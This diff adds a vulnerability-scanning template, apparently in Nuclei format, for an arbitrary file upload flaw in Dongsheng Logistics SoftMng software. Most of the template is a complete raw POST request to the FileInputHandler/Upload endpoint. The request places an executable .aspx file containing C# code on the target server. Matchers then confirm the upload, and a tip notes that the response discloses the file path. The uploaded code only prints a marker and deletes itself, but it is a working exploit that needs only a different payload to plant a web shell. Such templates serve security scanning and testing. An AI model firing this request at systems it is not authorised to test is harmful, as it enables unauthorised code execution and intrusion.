@@ -1,0 +1,49 @@
+id: dongshengsoft-FileInputHandler-Upload
+info:
+  name: 东胜物流 SoftMng FileInputHandler Upload 任意文件上传
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/a09c3778c7df907941342afba5c18f08cd515d9c/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%20SoftMng%20FileInputHandler%20Upload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.txt#L4
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: 查看响应包即可获得路径
+    repair:
+    version:
+  tags: fileupload,dongshengsoft
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /SoftMng/FileInputHandler/Upload HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Length: 211
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx"
+        Content-Type: application/octet-stream
+
+        <%@Page Language="C#"%><%Response.Write("{{randstr}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'success','true','data','UploadFiles','Filepuload')
+          - contains(header,'application/json')
+        condition: and
